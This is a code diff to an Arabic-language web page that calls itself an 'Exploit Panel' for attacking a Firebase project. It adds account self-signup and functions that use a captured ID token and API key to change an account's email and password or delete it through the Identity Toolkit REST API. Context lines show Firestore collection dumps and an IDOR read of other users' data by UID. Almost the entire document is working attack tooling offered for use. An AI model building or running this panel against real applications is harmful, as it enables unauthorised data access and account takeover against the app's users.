@@ -66,7 +66,7 @@
     <div class="header">
         <div>
             <h1>🔥 VENOX · Full Exploit Panel</h1>
-            <div class="subtitle">جميع المحاولات (Firestore, Functions, REST, Storage)</div>
+            <div class="subtitle">جميع المحاولات (Firestore, Functions, REST, Storage, IDOR)</div>
         </div>
         <span class="badge badge-connected" id="statusBadge">✅ جاهز</span>
     </div>
@@ -124,7 +124,9 @@
             <h3>🌐 REST API</h3>
             <div class="note">استخدام Firebase Auth REST API</div>
             <button class="btn btn-info" onclick="restLookup()">🔍 Lookup Account</button>
-            <button class="btn btn-info" onclick="restGetUserInfo()">👤 Get User Info</button>
+            <button class="btn btn-info" onclick="restChangeEmail()">✉️ تغيير البريد</button>
+            <button class="btn btn-info" onclick="restChangePassword()">🔑 تغيير كلمة المرور</button>
+            <button class="btn btn-danger" onclick="restDeleteAccount()">🗑️ حذف الحساب</button>
             <button class="btn btn-secondary" onclick="clearResult('restResult')">🗑️ مسح</button>
             <div id="restResult" class="result-box">⏳ اضغط زر...</div>
         </div>
@@ -137,6 +139,17 @@
             <button class="btn btn-secondary" onclick="clearResult('funcResult')">🗑️ مسح</button>
             <div id="funcResult" class="result-box">⏳ اضغط زر...</div>
         </div>
+    </div>
+
+    <!-- ===== CREATE ACCOUNT ===== -->
+    <div class="card">
+        <h3>🔐 إنشاء حساب جديد</h3>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+            <input type="email" id="signupEmail" placeholder="البريد" style="flex:1;padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:6px;color:#e2e8f0;min-width:150px;">
+            <input type="password" id="signupPassword" placeholder="كلمة المرور" style="flex:1;padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:6px;color:#e2e8f0;min-width:120px;" value="Test123!">
+            <button class="btn btn-success" onclick="createAccount()">🚀 إنشاء</button>
+        </div>
+        <div id="signupResult" class="result-box">⏳ انتظر...</div>
     </div>
 </div>
 
@@ -226,7 +239,32 @@ async function login() {
 }
 
 // ============================================================
-// 📄 FIRESTORE READ
+// 🔐 CREATE ACCOUNT
+// ============================================================
+async function createAccount() {
+    const email = document.getElementById('signupEmail').value.trim();
+    const password = document.getElementById('signupPassword').value.trim();
+    const result = document.getElementById('signupResult');
+    
+    if (!email || !password) {
+        setResult('signupResult', '❌ أدخل البريد وكلمة المرور', 'error');
+        return;
+    }
+    
+    setResult('signupResult', '⏳ جاري...', '');
+    
+    try {
+        const userCred = await auth.createUserWithEmailAndPassword(email, password);
+        setResult('signupResult', `✅ تم إنشاء الحساب!\nUID: ${userCred.user.uid}\nالبريد: ${userCred.user.email}`, 'success');
+        showToast('✅ تم إنشاء الحساب', 'success');
+    } catch (error) {
+        setResult('signupResult', `❌ فشل: ${error.message}`, 'error');
+        showToast(`❌ ${error.message}`, 'error');
+    }
+}
+
+// ============================================================
+// 📄 FIRESTORE
 // ============================================================
 async function fsRead(collection) {
     const result = document.getElementById('fsResult');
@@ -270,7 +308,7 @@ async function fsReadAll() {
 }
 
 // ============================================================
-// 🎯 IDOR READ
+// 🎯 IDOR
 // ============================================================
 async function idorRead() {
     const targetUid = document.getElementById('targetUid').value.trim();
@@ -332,18 +370,65 @@ async function restLookup() {
     }
 }
 
-async function restGetUserInfo() {
+async function restChangeEmail() {
     const result = document.getElementById('restResult');
     if (!currentToken) { setResult('restResult', '❌ سجل دخول أولاً', 'error'); return; }
-    setResult('restResult', '⏳ جاري...', '');
+    const newEmail = prompt('أدخل البريد الجديد:');
+    if (!newEmail) return;
+    setResult('restResult', '⏳ جاري تغيير البريد...', '');
     try {
         const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${API_KEY}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ idToken: currentToken, returnSecureToken: true })
+            body: JSON.stringify({
+                idToken: currentToken,
+                email: newEmail,
+                returnSecureToken: true
+            })
         });
         const data = await res.json();
-        setResult('restResult', `✅ User Info:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
+        setResult('restResult', `✅ تغيير البريد:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
+    } catch(e) {
+        setResult('restResult', `❌ ${e.message}`, 'error');
+    }
+}
+
+async function restChangePassword() {
+    const result = document.getElementById('restResult');
+    if (!currentToken) { setResult('restResult', '❌ سجل دخول أولاً', 'error'); return; }
+    const newPass = prompt('أدخل كلمة المرور الجديدة:');
+    if (!newPass) return;
+    setResult('restResult', '⏳ جاري تغيير كلمة المرور...', '');
+    try {
+        const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${API_KEY}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                idToken: currentToken,
+                password: newPass,
+                returnSecureToken: true
+            })
+        });
+        const data = await res.json();
+        setResult('restResult', `✅ تغيير كلمة المرور:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
+    } catch(e) {
+        setResult('restResult', `❌ ${e.message}`, 'error');
+    }
+}
+
+async function restDeleteAccount() {
+    const result = document.getElementById('restResult');
+    if (!currentToken) { setResult('restResult', '❌ سجل دخول أولاً', 'error'); return; }
+    if (!confirm('⚠️ هل أنت متأكد من حذف الحساب؟')) return;
+    setResult('restResult', '⏳ جاري حذف الحساب...', '');
+    try {
+        const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:delete?key=${API_KEY}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ idToken: currentToken })
+        });
+        const data = await res.json();
+        setResult('restResult', `🗑️ حذف الحساب:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
     } catch(e) {
         setResult('restResult', `❌ ${e.message}`, 'error');
     }
